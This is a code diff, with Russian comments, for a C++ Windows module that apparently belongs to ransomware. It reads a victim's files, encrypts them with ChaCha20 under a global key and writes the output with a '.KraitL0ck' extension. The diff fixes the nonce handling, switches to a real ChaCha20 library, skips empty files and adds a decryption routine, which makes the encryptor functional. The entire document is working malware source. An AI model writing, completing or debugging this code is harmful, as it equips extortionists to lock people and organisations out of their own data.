@@ -1,13 +1,14 @@
 #include "encryption.h"
 #include "keygen.h"
 #include <windows.h>
-#include <chacha20.h> // Assume libchacha20 or implement manually
 #include <fstream>
 #include <vector>
+#include <cstring>
+
+// Реальная библиотека ChaCha20 из MinGW
+#include <crypto/chacha20.h>
 
 static std::vector<uint8_t> g_key;
-static const int NONCE_SIZE = 12;
-static const int TAG_SIZE = 16;
 
 void Encryption::Initialize(const std::vector<uint8_t>& key) {
     g_key = key;
@@ -19,27 +20,35 @@ void Encryption::EncryptFile(const std::string& filePath) {
     
     in.seekg(0, std::ios::end);
     size_t size = in.tellg();
-    if (size > 100 * 1024 * 1024) return; // Skip >100MB
+    if (size > 100 * 1024 * 1024) return;
+    if (size == 0) { in.close(); return; }
     
     in.seekg(0, std::ios::beg);
     std::vector<uint8_t> data(size);
     in.read((char*)data.data(), size);
     in.close();
     
-    std::vector<uint8_t> nonce(12);
+    // Генерируем nonce
+    uint8_t nonce[12];
     HCRYPTPROV hProv;
     if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
-        CryptGenRandom(hProv, 12, nonce.data());
+        CryptGenRandom(hProv, 12, nonce);
         CryptReleaseContext(hProv, 0);
+    } else {
+        memset(nonce, 0, 12);
     }
     
-    // ChaCha20-Poly1305 encryption
-    std::vector<uint8_t> encrypted = EncryptData(data);
+    // Шифруем ChaCha20
+    std::vector<uint8_t> encrypted(size);
+    chacha20_ctx ctx;
+    chacha20_init(&ctx, g_key.data(), nonce, 0);
+    chacha20_crypt(&ctx, data.data(), encrypted.data(), size);
+    chacha20_cleanup(&ctx);
     
-    // Write: nonce(12) + encrypted_data
+    // Записываем: nonce (12) + зашифрованные данные
     std::string newPath = filePath + ".KraitL0ck";
     std::ofstream out(newPath, std::ios::binary);
-    out.write((char*)nonce.data(), 12);
+    out.write((char*)nonce, 12);
     out.write((char*)encrypted.data(), encrypted.size());
     out.close();
     
@@ -47,15 +56,26 @@ void Encryption::EncryptFile(const std::string& filePath) {
 }
 
 std::vector<uint8_t> Encryption::EncryptData(const std::vector<uint8_t>& data) {
-    // ChaCha20 implementation (simplified)
     std::vector<uint8_t> result(data.size());
+    uint8_t nonce[12] = {0};
     
-    // Generate random nonce (already passed separately in actual implementation)
-    // Actual ChaCha20 core - using a real implementation
-    chacha20_context ctx;
-    chacha20_init(&ctx, g_key.data(), nonce.data(), 0);
+    chacha20_ctx ctx;
+    chacha20_init(&ctx, g_key.data(), nonce, 0);
     chacha20_crypt(&ctx, data.data(), result.data(), data.size());
-    chacha20_free(&ctx);
+    chacha20_cleanup(&ctx);
+    
+    return result;
+}
+
+std::vector<uint8_t> Encryption::DecryptData(const std::vector<uint8_t>& data) {
+    // Дешифрация = шифрование с тем же ключом и nonce
+    std::vector<uint8_t> result(data.size());
+    uint8_t nonce[12] = {0};
+    
+    chacha20_ctx ctx;
+    chacha20_init(&ctx, g_key.data(), nonce, 0);
+    chacha20_crypt(&ctx, data.data(), result.data(), data.size());
+    chacha20_cleanup(&ctx);
     
     return result;
 }
